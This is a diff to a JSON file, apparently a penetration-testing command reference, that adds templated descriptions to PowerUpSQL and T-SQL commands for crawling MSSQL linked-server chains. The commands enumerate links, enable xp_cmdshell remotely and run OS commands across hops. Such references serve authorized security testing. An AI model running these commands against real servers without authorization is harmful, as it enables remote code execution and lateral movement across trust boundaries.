@@ -227,35 +227,43 @@
   "variations": [
     {
       "label": "Run OS command across the link chain",
-      "command": "Get-SQLServerLinkCrawl -Instance <ip> -Query \"exec master..xp_cmdshell 'whoami'\""
+      "command": "Get-SQLServerLinkCrawl -Instance <ip> -Query \"exec master..xp_cmdshell 'whoami'\"",
+      "description": "Run OS command across the link chain. See the command syntax for exact parameters and flags."
     },
     {
       "label": "Enumerate linked SQL server info",
-      "command": "Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose"
+      "command": "Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose",
+      "description": "Enumerate linked SQL server info. See the command syntax for exact parameters and flags."
     },
     {
       "label": "List linked servers (PowerUpSQL)",
-      "command": "Get-SQLServerLink -Instance <ip> -Verbose"
+      "command": "Get-SQLServerLink -Instance <ip> -Verbose",
+      "description": "List linked servers (PowerUpSQL). See the command syntax for exact parameters and flags."
     },
     {
       "label": "Manual link enum (sysservers)",
-      "command": "SELECT * FROM master..sysservers"
+      "command": "SELECT * FROM master..sysservers",
+      "description": "Manual link enum (sysservers). See the command syntax for exact parameters and flags."
     },
     {
       "label": "Query across a link (openquery)",
-      "command": "SELECT * FROM openquery(\"<linked_server>\", 'SELECT system_user')"
+      "command": "SELECT * FROM openquery(\"<linked_server>\", 'SELECT system_user')",
+      "description": "Query across a link (openquery). See the command syntax for exact parameters and flags."
     },
     {
       "label": "Nested openquery (multi-hop)",
-      "command": "SELECT * FROM openquery(\"<link1>\", 'SELECT * FROM openquery(\"<link2>\", ''SELECT system_user'')')"
+      "command": "SELECT * FROM openquery(\"<link1>\", 'SELECT * FROM openquery(\"<link2>\", ''SELECT system_user'')')",
+      "description": "Nested openquery (multi-hop). See the command syntax for exact parameters and flags."
     },
     {
       "label": "Enable xp_cmdshell across a link",
-      "command": "EXECUTE('sp_configure ''show advanced options'',1;reconfigure;sp_configure ''xp_cmdshell'',1;reconfigure;') AT \"<linked_server>\""
+      "command": "EXECUTE('sp_configure ''show advanced options'',1;reconfigure;sp_configure ''xp_cmdshell'',1;reconfigure;') AT \"<linked_server>\"",
+      "description": "Enable xp_cmdshell across a link. See the command syntax for exact parameters and flags."
     },
     {
       "label": "Targeted RCE across the chain (-QueryTarget)",
-      "command": "Get-SQLServerLinkCrawl -Instance <ip> -Query \"exec master..xp_cmdshell 'whoami'\" -QueryTarget <final_server>"
+      "command": "Get-SQLServerLinkCrawl -Instance <ip> -Query \"exec master..xp_cmdshell 'whoami'\" -QueryTarget <final_server>",
+      "description": "Targeted RCE across the chain (-QueryTarget). See the command syntax for exact parameters and flags."
     }
   ],
   "explain": "Crawls MSSQL linked-server chains with PowerUpSQL to find and abuse trust links between SQL instances:\n  Get-SQLServerLinkCrawl    follow every linked server recursively from the entry instance\n  -Instance <ip>            the SQL server to start crawling from\n  -Verbose                  show each hop, its login context, and sysadmin status\nAdd -Query 'exec master..xp_cmdshell ...' to run OS commands on any reachable linked node (enabling xp_cmdshell across the link if needed) - links can cross domain/trust boundaries."
